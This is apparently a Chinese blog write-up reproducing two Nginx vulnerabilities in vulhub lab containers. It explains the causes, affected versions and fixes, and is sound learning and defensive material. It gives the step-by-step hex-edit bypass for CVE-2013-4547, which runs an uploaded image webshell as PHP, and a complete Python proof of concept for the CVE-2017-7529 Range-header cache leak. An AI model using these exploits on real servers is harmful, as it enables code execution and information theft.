最近进行了vulhub上面一些漏洞的复现，在自己学习的过程中也进行了一些大佬笔记或复现的收集，在此奉上，希望路过的大佬可以指点一二。

nginx最多的还是解析漏洞,或者是缓存溢出漏洞。

## 零.nginx简介:

Nginx是一款轻量级的web服务器/反向代理服务器及电子邮件服务器，特点时占用内存小，并发能力强。

## 一.CVE-2013-4547

    
    
    ### 1.1 漏洞原理
    

> CGI：是一种协议，定义了web服务器传递的数据格式。
>
> FastCGI：优化版的CGI程序
>
> PHP-CGI：PHP解释器，能够对于PHP文件进行解析并且返回相应的解析结果
>
> PHP-FPM：FastCGI进程管理程序

当Nginx得到一个用户请求时，首先对于url进行解析，进行正则匹配，如果匹配到.php后缀结尾的文件名，将请求的php文件交给PHP-CGI去解析。其处理模块如下：

    
    
    location ~ \.php$ {
        root           html;
        include        fastcgi_params;
        fastcgi_pass   IP:9000;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
        fastcgi_param  DOCUMENT_ROOT /var/www/html;
    }
    

以.php结尾的文件都会交给该模块处理，其中fastcgi_pass就是Nginx与PHP-FPM之间的媒介，通过ip+port的方式将请求转发给PHP解释器。

CVE-2013-4547漏洞是由于非法字符空格和截止符号导致Nginx在解析URL时的有限状态混乱，导致攻击者可以通过一个非编码空格绕过后缀名限制。假设服务器中存在文件"123.png",则可以通过访问如下网址让服务器认为"123.png"的后缀为php

​ http://192.168.146.1/123.png\0.php

从代码层面来说，我们请求的url中123.png**[0x20]
[0x00]**.php正好与location模块中的.php相匹配，但是进入该模块后Nginx确认为请求文件时"123.png",就设置其为script_name的值交给CGI进行解析，最终造成文件解析漏洞。

### 2.影响版本

Nginx 0.8.41~1.43/1.50

### 3.漏洞复现

1.首先判断其文件上传的格式为白名单机制，上传一个1.jpg的木马，抓包后进行修改在其后加入一个空格—>1.jpg

然后放包

![image-20211112210026885](https://image.3001.net/images/20211117/1637114038_619460b61894f3a74d0fc.png!small)

2.发现其地址  
![image-20211112210048312](https://image.3001.net/images/20211117/1637114038_619460b61894f3a74d0fc.png!small)

3.构建请求url：http://192.168.127.133:8080/uploadfiles/1.jpgaaaphp

抓包后修改其2进制值将61 61 61 分别改为 20 00 2e

![image-20211112210100746](https://image.3001.net/images/20211117/1637114038_619460b61894f3a74d0fc.png!small)

![image-20211112210113719](https://image.3001.net/images/20211117/1637114038_619460b61894f3a74d0fc.png!small)

然后放包

![image-20211112210134654](https://image.3001.net/images/20211117/1637114046_619460be0cc4f1a376d69.png!small)

### 由于用户配置不当导致解析漏洞

### 4.漏洞修复

将Nginx升级到1.5.7之后

## 二.Nginx越界读取缓存漏洞(CVE-2017-7529)

### 1.Nginx反向代理

正向代理：代理服务器位于客户机与服务器之间；当客户机像访问服务器主机时，需要先设置代理，然后请求被发送到代理服务器，由代理服务器转发给服务器主机，服务器主机再把请求结果通过代理给予客户机。

反向代理：代理服务器位于服务端，客户机不需要设置代理，它会将客户机的请求交给内部网络上的目标服务器，目标服务器处理结果后再由它发送给客户机，此时代理与目标服务器表现为一个整体

Nginx反向代理服务器：安装与服务端，转发客户端请求给目标服务器，后台如果有多台http服务器提供服务，由它决定当前请求交给哪台服务器处理。

简单的反向代理配置如下:

    
    
    server {
        listen       8081;
        server_name  localhost;
    
        charset utf-8;
    
        location / {
            root   /usr/share/nginx/html;
            index  index.html;
        }
    }
    server {
        listen       8080;
        server_name  localhost;
    
        charset utf-8;
    
        location / {
            proxy_pass http://127.0.0.1:8081/;
            proxy_set_header HOST $host;
            proxy_cache cache_zone;
            add_header X-Proxy-Cache $upstream_cache_status;
            proxy_ignore_headers Set-Cookie;
        }
    

### 2.漏洞原理

Nginx在进行反向代理时，如果开启了代理缓存，通常会将服务器端的一些文件进行缓存，特别是静态文件。

每个缓存文件包括：文件头+HTTP包头+HTTP返回包体

当用户再次请求该文件时，Nginx会直接从该缓存文件中取出HTTP返回包头给用户

但是如果攻击者在请求中构造恶意的range头，就会导致缓存文件的文件头+HTTP+HTTP包头部分也被作为结果返回，导致服务器端的信息被泄露。

HTTP的range头可以指定start和end的值，然后返回请求文件指定大小的内容。对于一般文件而言，range域无论怎样设置都不会有什么问题，但是对于缓存文件而言，它还包含了额外的头部文件（服务端信息），因此如果start值被设置为复值时就有可能读取到缓存文件的头部。

### 3.影响版本

0.5.6 - 1.13.2

### 4.漏洞复现

进入/vulhub/nginx/CVE-2017-7529,启动靶场：docker-compose up -d

浏览器访问http://ip:8080

使用靶场自带的POC读取缓存文件： **python3 poc.py http://ip:8080**

    
    
    #poc源码
    
    #!/usr/bin/env python
    import sys
    import requests
    
    if len(sys.argv) < 2:
        print("%s url" % (sys.argv[0]))
        print("eg: python %s http://your-ip:8080/" % (sys.argv[0]))
        sys.exit()
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
    }
    #偏移值，以HTTP返回包体处为起点(相当于0)
    offset = 605 
    url = sys.argv[1]
    #获取HTTP返回包体的长度
    file_len = len(requests.get(url, headers=headers).content)
    n = file_len + offset
    #网上他人的源码分析来看需要将Range设置为：Range: bytes=-X,-Y;X的值可设的比HTTP返回包体长度大一些，且要小于Y的值
    headers['Range'] = "bytes=-%d,-%d" % (
        n, 0x8000000000000000 - n)
    r = requests.get(url, headers=headers)
    print(r.text)
    

可以成功访问到缓存文件，得到头部信息  
![image-20211112210151006](https://image.3001.net/images/20211117/1637114047_619460bfcf5827aa71abb.png!small)

## 5、漏洞修复

升级Nginx，打补丁

关闭Nginx代理缓存

